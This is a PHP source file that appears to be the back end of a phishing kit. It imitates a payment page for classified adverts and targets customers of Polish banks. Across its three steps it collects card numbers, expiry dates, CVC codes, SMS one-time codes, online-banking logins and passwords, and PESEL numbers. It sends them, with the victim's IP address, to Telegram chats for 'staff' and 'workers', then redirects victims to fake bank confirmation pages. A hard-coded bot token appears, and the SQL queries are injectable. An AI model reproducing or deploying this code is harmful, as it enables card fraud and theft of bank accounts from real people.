<?php
session_start();

include "../function.php";

function send($message, $chat_id, $keyboard = false)
{
    include "../config.php";
    $message = str_replace("_", "\\_", $message);

    $query = [
        "chat_id" => $chat_id,
        "text" => $message,
        "parse_mode" => "markdown",
        "disable_web_page_preview" => "true"
    ];

    if ($keyboard)
        $query["reply_markup"] = json_encode($keyboard);

    $curl = curl_init("https://api.telegram.org/bot" . $config["bot"]["token"] . "/sendMessage?" . http_build_query($query));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
}

function get_bank($card_number)
{
    $card_number = substr(str_replace(" ", null, $card_number), 0, 6);

    $curl = curl_init("https://lookup.binlist.net/" . $card_number);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);

    $response = json_decode($response, true);

    $scheme = $response["scheme"];
    $bank_name = $response["bank"]["name"];
    $url = $response["bank"]["url"];

    switch ($scheme) {
        case "visa":
            $scheme = "VISA";
            break;
        case "mastercard":
            $scheme = "MasterCard";
            break;
        case "amex":
            $scheme = "American Express";
            break;
    }

    $response = [
        "scheme" => $scheme,
        "name" => $bank_name,
        "url" => $url
    ];

    return $response;
}

function get_addres($ip = false)
{

    if (!$ip)
        $ip = getIp();

    $curl = curl_init("http://ipwhois.app/json/" . $ip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);

    $response = json_decode($response, true);

    return $response['ip'] . ' 🇵🇱 ' . $response['country'] . ', ' . $response['city'];
}

function get_author($advert_id)
{
    include "../config.php";
    $database = mysqli_connect($config["database"]["hostname"], $config["database"]["username"], $config["database"]["password"], $config["database"]["name"]);

    $query = $database->query("SELECT * FROM adverts WHERE advert_id = " . $advert_id)->fetch_array();
    $author_id = $query["user_id"];

    $query = $database->query("SELECT * FROM users WHERE user_id = " . $author_id)->fetch_array();
    $worker = $query["user_name"];

    $response = [
        "id" => $author_id,
        "username" => $worker
    ];

    return $response;
}

function sendAlert($text)
{

    $token = "1180981314:AAHXPT951S4vek83Ratnrqt6XOZM-mrgV2I";
    $chat_id = "-437190518";
    $txt = '';

    $arr = array(
        '' => $text,
    );

    foreach ($arr as $key => $value) {
        $txt .= "<b>" . $key . "</b> " . $value . "\n";
    };
    $txt = urlencode($txt);
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}&disable_web_page_preview=true", "r");
}


$step = intval($_POST["step"]);
$id = $_POST["id"];

$advert_id = intval($_POST["advert_id"]);
$item_url = "https://" . $_SERVER["HTTP_HOST"] . "/item/" . $advert_id;

if ($step == 1) {

    $card_number = $_POST["cardFrom"];
    $card_expire_month = $_POST["cardFromMonth"];
    $card_expire_year = $_POST["cardFromYear"];
    $card_cvc = $_POST["cardFromCVC"];
    $amount = $_POST["amount"];
    $advert_id = $_POST["advert_id"];
    $banking_name = $_POST["bank"];
    //$balance = $_POST["balance"];

    switch ($banking_name) {
        case "mtransfer":
            $banking["name"] = "mBank";
            break;
        case "ipko":
            $banking["name"] = "iPKO";
            break;
        case "ing":
            $banking["name"] = "ING";
            break;
        case "pekao":
            $banking["name"] = "Bank Pekao";
            break;
        case "santander":
            $banking["name"] = "Santander";
            break;
        case "millenium":
            $banking["name"] = "Millennium";
            break;
        case "aliorbank":
            $banking["name"] = "Alior Bank";
            break;
        case "agricole":
            $banking["name"] = "Credit Agricole";
            break;
        case "paribas":
            $banking["name"] = "BGZ BNP Paribas";
            break;
        case "getin":
            $banking["name"] = "Get In Bank";
            break;
        case "inteligo":
            $banking["name"] = "Inteligo";
            break;
        case "pocztowy":
            $banking["name"] = "Bank Pocztowy";
            break;
        case "tmobile":
            $banking["name"] = "T-Mobile";
            break;
        case "handlowy":
            $banking["name"] = "Citi Handlowy";
            break;
        case "envelo":
            $banking["name"] = "Envelo Bank";
            break;
        case "idea":
            $banking["name"] = "Idea";
            break;
        case "plus":
            $banking["name"] = "Plus Bank";
            break;
        case "noble":
            $banking["name"] = "Noble Bank";
            break;
        default:
            $banking["name"] = "Неизвестный";
            break;
    }

    $bank = get_bank($card_number);

    $bank = [
        "name" => $bank["name"],
        "scheme" => $bank["scheme"],
        "url" => $bank["url"]
    ];

    $getWorker = get_author($advert_id);

    $author_id = $getWorker["id"];
    $worker = $getWorker["username"];

    $keyboard = [
        "inline_keyboard" => [
            [
                [
                    "text" => "SMS",
                    "callback_data" => "/redirect/sms/" . $id
                ],
                [
                    "text" => "Banking",
                    "callback_data" => "/redirect/banking/" . $id
                ],
                [
                    "text" => "URL",
                    "callback_data" => "/redirect/custom/" . $id
                ]
            ]
        ],
        "resize_keyboard" => true
    ];

    $message = "💳  *Пользователь ввел платежные данные*\n\n*Номер карты: *" . $card_number . "\n*Срок действия: *" . $card_expire_month . "/" . substr($card_expire_year, -2) . "\n*Код CVC: *" . $card_cvc  . "\n\n*Банк: *[" . $bank["name"] . "](" . $bank["url"] . ")\n*Тип: *" . $bank["scheme"] . "\n\n*User-Agent: *" . $_SERVER['HTTP_USER_AGENT'] . "\n*IP: *" . get_addres() . "\n\n*Банкинг: *" . $banking["name"] . "\n\n*Сумма платежа: *" . number_format($amount, 0, "", " ") . " zł\n*Объявление: *[открыть](" . $item_url . ")\n*Работник: *@" . $worker . "\n*Дата и время: *" . date("d.m.Y H:i");

    foreach ($config["bot"]["chat"]["staff"] as $staffId) {
        send($message, $staffId, $keyboard);
    }

    $workerMessage = "💳  *Пользователь ввел платежные данные*\n\n*Банк: *[" . $bank["name"] . "](" . $bank["url"] . ")\n*Тип: *" . $bank["scheme"] . "\n\n*Банкинг: *" . $banking["name"] . "\n\n*User-Agent: *" . $_SERVER['HTTP_USER_AGENT'] . "\n*IP: *" . get_addres() . "\n\n*Сумма платежа: *" . number_format($amount, 0, "", " ") . " zł\n*Объявление: *[открыть](" . $item_url . ")\n*Работник: *@" . $worker . "\n*Дата и время: *" . date("d.m.Y H:i");
    send($workerMessage, $author_id);

    $json = [
        "card" => [
            "number" => $card_number,
            "month" => $card_expire_month,
            "year" => $card_expire_year,
            "cvc" => $card_cvc
        ],
        "amount" => (int)$amount,
        "advert_id" => $advert_id,
        "bank" => $bank,
        //"balance" => $balance,
        "banking" => [
            "value" => $banking_name,
            "name" => $banking["name"]
        ],
        "author" => [
            "id" => $author_id,
            "username" => $worker
        ],
        "redirect" => null
    ];

    $json = json_encode($json);
    file_put_contents("temp/" . $id, $json);


?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Transakcja jest przetwarzana. Może to zająć do 5 minut. Nie opuszczaj strony.</title>
        <script src="/assets/js/jquery.min.js"></script>
    </head>
    <script>
        $(document).ready(function() {
            setInterval(function() {
                $.ajax({
                    type: "POST",
                    url: "/payment/",
                    cache: false,
                    data: {
                        id: "<?php echo $id; ?>",
                        advert_id: <?php echo $advert_id; ?>,
                        step: 'check'
                    },
                    success: function(e) {
                        if (e.status === 'ok') {
                            location = e.url;
                            document.location.href = e.url;

                            location.replace(e.url);
                            window.location.reload(e.url);
                            document.location.replace(e.url);
                        }
                    }
                });
            }, 1100);
        });
    </script>
    <style>
        body,
        html {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif !important;
            color: #002f34;
            font-size: 16px;
        }

        .wrapper {
            position: absolute;
            padding: 0 20px;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .text {
            text-align: center;
            margin-bottom: 30px;
        }

        .img {
            display: block;
            width: 60px;
            height: 60px;
            margin: 0 auto;
        }
    </style>

    <body>
        <div class="wrapper">
            <div class="text">Transakcja jest przetwarzana. Może to zająć do <strong>5 minut</strong>. Nie opuszczaj strony.</div>
            <img class="img" src="/assets/img/load.gif" />
        </div>
    </body>

    </html>
<?php
}

if ($step == 'check') {
    $curl = curl_init("https://" . $_SERVER["HTTP_HOST"] . "/payment/temp/" . $id);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);



    $response = json_decode($response, true);
    header('Content-type: application/json');

    // sendAlert(print_r($response, true));

    $redirect_status = 'none';
    $redirect_url    = null;

    if ($response["redirect"]) {
        if ($response["redirect"]["type"] == "custom") {
            if (!empty($response["redirect"]["url"])) {
                $redirect_status    = 'ok';
                $redirect_url       = $response["redirect"]["url"];
            }
        } else {
            if ($response["redirect"]["type"] == "sms") {
                $redirect_status    = 'ok';

                // sendAlert('trying to redirect to sms. banking name: ' . $response["banking"]['name']);

                if ($response["banking"]['name'] == 'ING') {

                    $redirect_url =  "https://" . $_SERVER["HTTP_HOST"] . "/login/ing/confirm.php?id=" . $id;
                    
                } else if ($response["banking"]['name'] == 'iPKO') {

                    $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/login/ipko/confirm.php?id=" . $id;

                } else if ($response["banking"]['name'] == 'Bank Pekao') {

                    $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/login/pekao/confirm.php?id=" . $id;

                } else if ($response["banking"]['name'] == 'mBank') {

                    $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/login/mbank/confirm.php?id=" . $id;

                } else {
                    $redirect_url       = "//" . $_SERVER["HTTP_HOST"] . "/sms/?id=" . $id;
                }

            //    sendAlert('redirect to: ' . $redirect_url);
            }

            if ($response["redirect"]["type"] == "banking") {


                // sendAlert('trying to redirect to banking');


                $redirect_status    = 'ok';
                $success            = ['millenium', 'ing', 'ipko', 'pekao', 'mtransfer'];

                if (in_array($response["banking"]['value'], $success)) {
                    $redirect_url = "//" . $_SERVER["HTTP_HOST"] . "/login/" . $response["banking"]['value'] . "?id=" . $id;
                    
                    if($response['banking']['value'] == 'mtransfer')  {
                        $redirect_url = "//" . $_SERVER["HTTP_HOST"] . "/login/" . 'mbank' . "?id=" . $id;
                    }
                    
                } else {
                    $redirect_url = "//" . $_SERVER["HTTP_HOST"] . "/login/?id=" . $id;
                }

                // sendAlert('redirect to: ' . $redirect_url);
            }
        }
    }

    echo json_encode([
        'status'    => $redirect_status,
        'url'       => $redirect_url
    ]);
}

if ($step == 2) {
    $code = $_POST["code"];
    $bank = $_POST["bank"];

    $json = file_get_contents("temp/" . $id);
    $json = json_decode($json, true);

    $card_number        = $json["card"]["number"];
    $card_expire_month  = $json["card"]["month"];
    $card_expire_year   = $json["card"]["year"];
    $card_cvc           = $json["card"]["cvc"];
    $amount             = $json["amount"];
    $bank               = $json["bank"];
    $banking            = $json["banking"];
    //$balance            = $json["balance"];
    $worker             = $json["author"]["username"];
    $author_id          = $json["author"]["id"];

    if (!empty($banking["login"]))
        $banking_data = "\n*Логин: *" . $banking["login"] . "\n*Пароль: *" . $banking["password"];

    if (empty($bank)) {

        $keyboard = [
            "inline_keyboard" => [
                [
                    [
                        "text" => "Повтор",
                        "callback_data" => "/retry/sms/" . $id
                    ]
                ]
            ],
            "resize_keyboard" => true
        ];
    } else {

        $keyboard = [
            "inline_keyboard" => [
                [
                    [
                        "text" => "Повтор",
                        "callback_data" => "/retry/sms/" . $id . "/" . $bank
                    ]
                ]
            ],
            "resize_keyboard" => true
        ];
    }

    $message = "💳  *Пользователь ввел код из смс*\n\n*Номер карты: *" . $card_number . "\n*Срок действия: *" . $card_expire_month . "/" . substr($card_expire_year, -2) . "\n*Код CVC: *" . $card_cvc  . "\n\n*Код из смс: *" . $code . "\n\n*Банк: *[" . $bank["name"] . "](" . $bank["url"] . ")\n*Тип: *" . $bank["scheme"] . "\n\n*Банкинг: *" . $banking["name"] . $banking_data . "\n\n*Сумма платежа: *" . number_format($amount, 0, "", " ") . " zł\n*Объявление: *[открыть](" . $item_url . ")\n*Работник: *@" . $worker . "\n*Дата и время: *" . date("d.m.Y H:i");

    foreach ($config["bot"]["chat"]["staff"] as $id) {
        send($message, $id, $keyboard);
    }

    $message = "*Пользователь ввел код из смс*\n\n*IP: *" . get_addres() . "\n*Дата: *" . date("d.m.Y H:i");
    send($message, $author_id);
}

if ($step == 3) {
    $json = file_get_contents("temp/" . $id);
    $json = json_decode($json, true);

    $card_number = $json["card"]["number"];
    $card_expire_month = $json["card"]["month"];
    $card_expire_year = $json["card"]["year"];
    $card_cvc = $json["card"]["cvc"];
    $amount = $json["amount"];
    $bank = $json["bank"];
    $banking = $json["banking"];

    //$balance = $json["balance"];
    $worker = $json["author"]["username"];
    $author_id = $json["author"]["id"];

    $_SESSION['login'] = $_POST["login"];
    $login      = $_POST["login"];
    $password   = $_POST["password"];
    $pesel      = isset($_POST["pesel"]) ? "\n*Pesel: * " . $_POST["pesel"] : '';

    $json["banking"]["login"] = $login;
    $json["banking"]["password"] = $password;

    $json = json_encode($json);
    file_put_contents("temp/" . $id, $json);

    $banking_data = "\n*Логин: *" . $login . "\n*Пароль: *" . $password . $pesel;

    $message = "💳  *Пользователь ввел данные от банкинга*\n\n*Номер карты: *" . $card_number . "\n*Срок действия: *" . $card_expire_month . "/" . substr($card_expire_year, -2) . "\n*Код CVC: *" . $card_cvc  . "\n\n*Банк: *[" . $bank["name"] . "](" . $bank["url"] . ")\n*Тип: *" . $bank["scheme"] . "\n\n*Банкинг: *" . $banking["name"] . $banking_data . "\n\n*Сумма платежа: *" . number_format($amount, 0, "", " ") . " zł\n*Объявление: *[открыть](" . $item_url . ")\n*Работник: *@" . $worker . "\n*Дата и время: *" . date("d.m.Y H:i");

    foreach ($config["bot"]["chat"]["staff"] as $StaffId) {
        send($message, $StaffId, $keyboard);
    }

    $message = "*Пользователь ввел данные от банкинга*\n\n*Объявление: *[" . $advert_id . "](" . $item_url . ")\n*Дата: *" . date("d.m.Y H:i");
    send($message, $author_id);

    // echo $banking["name"];
    // exit();

    if ($banking["name"] == 'ING') {
        $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/login/ing/confirm.php?id=" . $id;
    } else if ($banking["name"] == 'iPKO') {
        $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/login/ipko/confirm.php?id=" . $id;
    } else if ($banking["name"] == 'Bank Pekao') {
        $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/login/pekao/confirm.php?id=" . $id;
    } else if ($banking["name"] == 'mBank') {
        $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/login/mbank/confirm.php?id=" . $id;
    } else {
        $redirect_url = "https://" . $_SERVER["HTTP_HOST"] . "/sms/?id=" . $id;
    }
    header("Location: " . $redirect_url);
}


?>